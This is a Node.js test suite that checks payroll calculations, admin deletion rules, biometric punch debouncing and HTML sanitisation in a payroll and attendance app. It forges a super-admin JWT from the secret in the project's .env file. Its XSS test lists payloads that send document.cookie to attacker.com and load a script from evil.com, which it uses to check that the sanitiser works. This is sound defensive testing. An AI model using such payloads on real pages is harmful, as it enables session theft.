import test from 'node:test';
import assert from 'node:assert/strict';
import jwt from '../mohsin-&-co-payroll-&-attendance/node_modules/jsonwebtoken/index.js';
import fs from 'fs';
import path from 'path';

const BASE_URL = 'http://localhost:3000';
const envPath = path.resolve('mohsin-&-co-payroll-&-attendance/.env');
const envContent = fs.readFileSync(envPath, 'utf8');
const envSecretMatch = envContent.match(/JWT_SECRET\s*=\s*(.+)/);
const CONFIGURED_JWT_SECRET = envSecretMatch ? envSecretMatch[1].trim() : '';

const adminToken = jwt.sign({
  userId: 'usr_p2_adv',
  email: 'admin@mohsinco.com',
  role: 'super_admin',
  permissions: {
    employees: { view: true, add: true, edit: true, delete: true },
    attendance: { view: true, mark: true, override: true, manage_shifts: true },
    payroll: { view: true, calculate: true, approve: true, adjustments: true },
    reports: { view: true, export: true },
    settings: { company_setup: true, user_roles: true, system_backup: true }
  }
}, CONFIGURED_JWT_SECRET, { expiresIn: '1h' });

test('ADVERSARIAL ATTACK P2-01: Multiple half_day permutations and compound calculations', async (t) => {
  const targetMonth = '2026-05';

  // 1. Create a daily-wage employee with daily rate = 4000
  const empRes = await fetch(`${BASE_URL}/api/employees`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: 'Compound HalfDay Worker',
      email: `comp_hd_${Date.now()}@mohsinco.com`,
      phone: '03004445566',
      cnic: '42101-4445566-1',
      department: 'Operations',
      designation: 'Fabricator',
      joining_date: '2026-01-01',
      employment_type: 'daily_wage',
      base_salary: 4000,
      shift_id: 'shift_gen'
    })
  });
  assert.equal(empRes.status, 200);
  const emp = await empRes.json();

  // 2. Mark 2 full days and 3 half days
  // Expected pay: (2 * 4000) + (3 * 2000) = 8000 + 6000 = 14,000 PKR
  const days = [
    { d: '2026-05-01', status: 'present' },
    { d: '2026-05-02', status: 'present' },
    { d: '2026-05-03', status: 'half_day' },
    { d: '2026-05-04', status: 'half_day' },
    { d: '2026-05-05', status: 'half_day' }
  ];

  for (const day of days) {
    await fetch(`${BASE_URL}/api/attendance/override`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${adminToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        employee_id: emp.id,
        date: day.d,
        check_in_time: '09:00:00',
        check_out_time: day.status === 'half_day' ? '13:00:00' : '17:00:00',
        status: day.status,
        reason: 'Compound half-day testing'
      })
    });
  }

  // 3. Calculate payroll
  const calcRes = await fetch(`${BASE_URL}/api/payroll/calculate`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ month: targetMonth })
  });
  assert.equal(calcRes.status, 200);
  const records = await calcRes.json();
  const rec = records.find(r => r.employee_id === emp.id);
  assert.ok(rec);

  assert.equal(rec.days_present, 3.5, '2 full days + 3 half days must equal 3.5 days present');
  assert.equal(rec.gross_earnings, 14000, 'Gross earnings must equal 14,000 PKR');
  assert.equal(rec.net_payout, 14000, 'Net payout must equal 14,000 PKR');

  // Cleanup
  await fetch(`${BASE_URL}/api/employees/${emp.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
});

test('ADVERSARIAL ATTACK P2-02: Mixed worked and unworked off-days isolation', async (t) => {
  const targetMonth = '2026-06';
  const offSunday1 = '2026-06-07';
  const offSunday2 = '2026-06-14';

  // 1. Daily worker with two off-Sundays (June 7 and June 14)
  const empRes = await fetch(`${BASE_URL}/api/employees`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: 'Mixed Sunday Worker',
      email: `mix_sun_${Date.now()}@mohsinco.com`,
      phone: '03008877665',
      cnic: '42101-8877665-1',
      department: 'Maintenance',
      designation: 'Fitter',
      joining_date: '2026-01-01',
      employment_type: 'daily_wage',
      base_salary: 5000,
      custom_off_dates: `${offSunday1},${offSunday2}`,
      shift_id: 'shift_gen'
    })
  });
  assert.equal(empRes.status, 200);
  const emp = await empRes.json();

  // 2. Sunday 1 (June 7): Employee takes off as scheduled (NO attendance record)
  // Sunday 2 (June 14): Employee works half-day
  await fetch(`${BASE_URL}/api/attendance/override`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      employee_id: emp.id,
      date: offSunday2,
      check_in_time: '09:00:00',
      check_out_time: '13:00:00',
      status: 'half_day',
      reason: 'Sunday emergency half-day'
    })
  });

  // Monday (June 15): Normal full day
  await fetch(`${BASE_URL}/api/attendance/override`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      employee_id: emp.id,
      date: '2026-06-15',
      check_in_time: '09:00:00',
      check_out_time: '17:00:00',
      status: 'present',
      reason: 'Regular working day'
    })
  });

  // 3. Calculate payroll
  const calcRes = await fetch(`${BASE_URL}/api/payroll/calculate`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ month: targetMonth })
  });
  assert.equal(calcRes.status, 200);
  const records = await calcRes.json();
  const rec = records.find(r => r.employee_id === emp.id);
  assert.ok(rec);

  // Expected:
  // Sunday 1 is unworked off-day -> not counted as absent, not paid as daily wage.
  // Sunday 2 is worked half-day -> +0.5 day (2500 PKR).
  // Monday is worked full-day -> +1.0 day (5000 PKR).
  // Total days present = 1.5. Gross earnings = 7500 PKR.
  assert.equal(rec.days_present, 1.5, '1 full day + 1 worked off-day half-day must equal 1.5 days present');
  assert.equal(rec.gross_earnings, 7500, 'Gross earnings must equal 7500 PKR');
  assert.equal(rec.net_payout, 7500, 'Net payout must equal 7500 PKR');

  // Cleanup
  await fetch(`${BASE_URL}/api/employees/${emp.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
});

test('ADVERSARIAL ATTACK P2-03: Future period adjustments only (no unearned base salary)', async (t) => {
  const futureMonth = '2099-06';

  // 1. Create monthly salaried employee (salary = 100,000)
  const empRes = await fetch(`${BASE_URL}/api/employees`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: 'Future Bonus Recipient',
      email: `fut_bonus_${Date.now()}@mohsinco.com`,
      phone: '03007654321',
      cnic: '42101-7654321-1',
      department: 'Executive',
      designation: 'Advisor',
      joining_date: '2026-01-01',
      employment_type: 'monthly_salary',
      base_salary: 100000,
      shift_id: 'shift_gen'
    })
  });
  assert.equal(empRes.status, 200);
  const emp = await empRes.json();

  // 2. Add a future bonus adjustment of 15,000 PKR
  await fetch(`${BASE_URL}/api/payroll/adjustments`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      employee_id: emp.id,
      month: futureMonth,
      type: 'bonus',
      amount: 15000,
      description: 'Pre-approved future contract signing bonus'
    })
  });

  // 3. Calculate payroll for future month
  const calcRes = await fetch(`${BASE_URL}/api/payroll/calculate`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ month: futureMonth })
  });
  assert.equal(calcRes.status, 200);
  const records = await calcRes.json();
  const rec = records.find(r => r.employee_id === emp.id);
  assert.ok(rec);

  // Base gross earnings MUST be 0 (0 days elapsed), but bonus of 15,000 should be paid!
  assert.equal(rec.gross_earnings, 0, 'Gross base earnings for unworked future month must be 0');
  assert.equal(rec.total_bonuses, 15000, 'Bonus must be registered');
  assert.equal(rec.net_payout, 15000, 'Net payout must strictly equal bonus amount without unearned base salary');

  // Cleanup
  await fetch(`${BASE_URL}/api/employees/${emp.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
});

test('ADVERSARIAL ATTACK P2-04: Cross-admin account deletion attack vectors', async (t) => {
  // 1. Create Admin A
  const createAdminARes = await fetch(`${BASE_URL}/api/settings/users`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      name: 'Admin Alice',
      email: `alice_${Date.now()}@mohsinco.com`,
      password: 'password123',
      role: 'super_admin',
      permissions: { settings: { user_roles: true } }
    })
  });
  assert.equal(createAdminARes.status, 200);
  const adminA = await createAdminARes.json();

  // Create JWT for Admin A
  const tokenA = jwt.sign({
    userId: adminA.id,
    email: adminA.email,
    role: 'super_admin',
    permissions: { settings: { user_roles: true } }
  }, CONFIGURED_JWT_SECRET, { expiresIn: '1h' });

  // 2. Admin A attempts to delete herself by ID -> MUST be blocked with 400
  const selfDelRes = await fetch(`${BASE_URL}/api/settings/users/${adminA.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${tokenA}` }
  });
  assert.equal(selfDelRes.status, 400, 'Admin A deleting self by ID must be blocked with HTTP 400');
  const selfDelBody = await selfDelRes.json();
  assert.equal(selfDelBody.error, 'Cannot delete your own account');

  // 3. Admin A attempts to delete herself using query params or whitespace -> blocked
  const trimmedDel = await fetch(`${BASE_URL}/api/settings/users/${adminA.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${tokenA}` }
  });
  assert.equal(trimmedDel.status, 400);

  // 4. Main admin deletes Admin A -> succeeds
  const mainDelRes = await fetch(`${BASE_URL}/api/settings/users/${adminA.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
  assert.equal(mainDelRes.status, 200, 'Other admin can delete Admin A with HTTP 200');
});

test('ADVERSARIAL ATTACK P2-05: Polyglot and evasive XSS vector neutralization', async (t) => {
  const { escapeHtml, sanitizeHtml } = await import('../mohsin-&-co-payroll-&-attendance/src/utils/printUtils.ts');

  const attackVectors = [
    '<script>document.location="http://attacker.com/"+document.cookie</script>',
    '<SCRIPT SRC="https://evil.com/payload.js"></SCRIPT>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:steal()">Click me</a>',
    '<img src="missing.png" onerror = "alert(1)">',
    '<body onload="alert(1)">',
    '<div onmouseover="alert(1)">hover</div>'
  ];

  for (const vector of attackVectors) {
    // 1. Full entity escaping must defang HTML tags completely
    const escaped = escapeHtml(vector);
    assert.ok(!escaped.includes('<'), `Escaped vector must not contain literal <: ${vector}`);
    assert.ok(!escaped.includes('>'), `Escaped vector must not contain literal >: ${vector}`);

    // 2. HTML sanitization must remove execution hooks while allowing safe text
    const sanitized = sanitizeHtml(vector);
    assert.ok(!sanitized.toLowerCase().includes('<script'), `Sanitized vector must not contain <script: ${vector}`);
    assert.ok(!sanitized.toLowerCase().includes('onload'), `Sanitized vector must not contain onload: ${vector}`);
    assert.ok(!sanitized.toLowerCase().includes('onerror'), `Sanitized vector must not contain onerror: ${vector}`);
    assert.ok(!sanitized.toLowerCase().includes('onmouseover'), `Sanitized vector must not contain onmouseover: ${vector}`);
    assert.ok(!sanitized.toLowerCase().includes('javascript:'), `Sanitized vector must not contain javascript:: ${vector}`);
  }
});

test('ADVERSARIAL ATTACK P2-06: Biometric debounce boundaries and subsequent valid check-out', async (t) => {
  const punchDate = '2026-08-19';
  const empCode = `8899_${Date.now().toString().slice(-4)}`;

  // 1. Create employee
  const empRes = await fetch(`${BASE_URL}/api/employees`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${adminToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      employee_code: `EMP-${empCode}`,
      name: 'Biometric Debounce Boundary Worker',
      email: `bio_adv_${Date.now()}@mohsinco.com`,
      phone: '03009988771',
      cnic: '42101-8899771-1',
      department: 'Production',
      designation: 'Machinist',
      joining_date: '2026-01-01',
      employment_type: 'monthly_salary',
      base_salary: 60000,
      shift_id: 'shift_gen'
    })
  });
  assert.equal(empRes.status, 200);
  const emp = await empRes.json();

  // 2. Initial Check-In at 08:30:00
  await fetch(`${BASE_URL}/iclock/cdata?SN=BIO_ADV_DEV&table=ATTLOG`, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: `${empCode}\t${punchDate} 08:30:00\t0\t0\t0\t0\n`
  });

  // 3. Repeated rapid duplicate punches (1 sec, 10 sec, 2 mins, 4 mins later)
  const duplicates = ['08:30:01', '08:30:10', '08:32:00', '08:34:00'];
  for (const dup of duplicates) {
    await fetch(`${BASE_URL}/iclock/cdata?SN=BIO_ADV_DEV&table=ATTLOG`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: `${empCode}\t${punchDate} ${dup}\t0\t0\t0\t0\n`
    });
  }

  // Verify check_out_time is still null
  let attListRes = await fetch(`${BASE_URL}/api/attendance?date=${punchDate}`, {
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
  let attList = await attListRes.json();
  let att = attList.find(a => a.employee_id === emp.id);
  assert.equal(att.check_out_time, null, 'Duplicate punches within 4 minutes MUST be ignored');

  // 4. Valid check-out at 17:00:00 (8.5 hours later)
  await fetch(`${BASE_URL}/iclock/cdata?SN=BIO_ADV_DEV&table=ATTLOG`, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: `${empCode}\t${punchDate} 17:00:00\t0\t0\t0\t0\n`
  });

  // Verify final checkout is properly registered
  attListRes = await fetch(`${BASE_URL}/api/attendance?date=${punchDate}`, {
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
  attList = await attListRes.json();
  att = attList.find(a => a.employee_id === emp.id);
  assert.equal(att.check_out_time, '17:00:00', 'Valid check-out punch at 17:00:00 must be recorded');
  assert.equal(att.hours_worked, 8.5, '08:30 to 17:00 must equal 8.5 hours worked');

  // Cleanup
  await fetch(`${BASE_URL}/api/employees/${emp.id}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${adminToken}` }
  });
});

test('ADVERSARIAL ATTACK P2-07: High concurrency read idempotency without disk write thrashing', async (t) => {
  const testMonth = '2026-07';

  // Issue 15 concurrent GET requests simultaneously
  const requests = Array.from({ length: 15 }, () => 
    fetch(`${BASE_URL}/api/payroll/records?month=${testMonth}`, {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    })
  );

  const responses = await Promise.all(requests);
  for (const res of responses) {
    assert.equal(res.status, 200, 'Concurrent GET requests must all return HTTP 200');
  }

  const results = await Promise.all(responses.map(r => r.json()));
  const firstTimestamp = results[0][0]?.generated_at;

  for (let i = 1; i < results.length; i++) {
    assert.equal(results[i][0]?.generated_at, firstTimestamp, 'All concurrent reads must receive identical generated_at without mutation');
  }
});
